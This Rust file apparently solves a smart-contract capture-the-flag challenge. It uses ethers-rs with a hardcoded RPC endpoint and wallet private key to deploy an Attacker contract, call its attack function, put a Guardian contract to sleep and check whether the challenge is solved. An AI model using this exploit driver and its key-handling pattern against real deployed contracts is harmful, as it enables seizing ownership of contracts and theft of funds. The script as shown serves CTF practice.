use ethers::{
    core::k256::ecdsa::SigningKey,
    prelude::*,
    utils::{hex::FromHex}, etherscan::contract,
};
use std::{sync::Arc, time::Duration};

abigen!(Setup, "./out/Setup.sol/Setup.json");
abigen!(Guardian, "./out/Guardian.sol/Guardian.json");
abigen!(Attacker, "./out/Attacker.sol/Attacker.json");

pub struct Contracts {
    setup: Setup<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>>,
    guardian: Guardian<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>>,
    attacker: Attacker<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>>,
}

const RPC_URL: &str = "http://34.159.107.195:18546/914e3e68-a154-461d-97d4-36a93854f33e";
pub static WALLET_PRIVATE_KEY: &str =
    "0x5addb90ff56cf8d17f627d30e2afdb5db28810ce8dd77add8c9d8b8e4e54f73d";
pub static SETUP_CONTRACT_ADDRESS: &str = "0xB28070edaBFc944c2f4C081E9384bfC3f5886b71";

pub static PROVIDER: Lazy<Provider<Http>> = Lazy::new(|| {
    Provider::<Http>::try_from(RPC_URL)
        .unwrap()
        .interval(Duration::from_millis(10u64))
});

pub async fn contracts() -> Contracts {
    let wallet: SignerMiddleware<Provider<Http>, LocalWallet> = {
        let signer: Wallet<SigningKey> = SigningKey::from_slice(
            Bytes::from_hex(WALLET_PRIVATE_KEY)
                .unwrap()
                .to_vec()
                .as_slice(),
        )
        .unwrap()
        .into();
        SignerMiddleware::new(
            PROVIDER.clone(),
            signer.with_chain_id(PROVIDER.get_chainid().await.unwrap().as_u64()),
        )
    };

    let client = Arc::new(wallet.clone());

    let setup: Setup<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>> = Setup::new(
        SETUP_CONTRACT_ADDRESS.parse::<H160>().unwrap(),
        client.clone(),
    );
    let guardian: Guardian<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>> =
        Guardian::new(setup.target().call().await.unwrap(), client.clone());
    let attacker: Attacker<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>> =
        Attacker::deploy(client.clone(), setup.address())
            .unwrap()
            .send()
            .await
            .unwrap();

    Contracts {
        setup,
        guardian,
        attacker,
    }
}

// run with `cargo run -- --nocapture`
#[tokio::main]
async fn main() {
    let contracts = contracts().await;

    dbg!(contracts.guardian.asleep().call().await.unwrap());
    dbg!(contracts.guardian.owner().call().await.unwrap());

    let tx = contracts.attacker.attack().value(1337);
    match tx.clone().send().await {
        Ok(pending_tx) => {
            pending_tx.await.unwrap();
            dbg!(contracts.guardian.asleep().call().await.unwrap());
            dbg!(contracts.guardian.owner().call().await.unwrap());
        }
        Err(e) => {
            if let Some(decoded_error) = e.decode_revert::<String>() {
                dbg!(contracts.guardian.asleep().call().await.unwrap());
                dbg!(contracts.guardian.owner().call().await.unwrap());
                panic!("{}", decoded_error);
            } else {
                match e.as_revert() {
                    Some(revert) => {
                        panic!("{}", revert);
                    }
                    None => {
                        panic!("{}", e);
                    }
                }
            }
        }
    }
    let tx2 = contracts.guardian.put_to_sleep();
    match tx2.clone().send().await {
        Ok(pending_tx) => {
            pending_tx.await.unwrap();
            dbg!(contracts.guardian.asleep().call().await.unwrap());
            dbg!(contracts.guardian.owner().call().await.unwrap());
        }
        Err(e) => {
            if let Some(decoded_error) = e.decode_revert::<String>() {
                dbg!(contracts.guardian.asleep().call().await.unwrap());
                dbg!(contracts.guardian.owner().call().await.unwrap());
                panic!("{}", decoded_error);
            } else {
                match e.as_revert() {
                    Some(revert) => {
                        panic!("{}", revert);
                    }
                    None => {
                        panic!("{}", e);
                    }
                }
            }
        }
    }

    dbg!(contracts.setup.is_solved().call().await.unwrap());
}
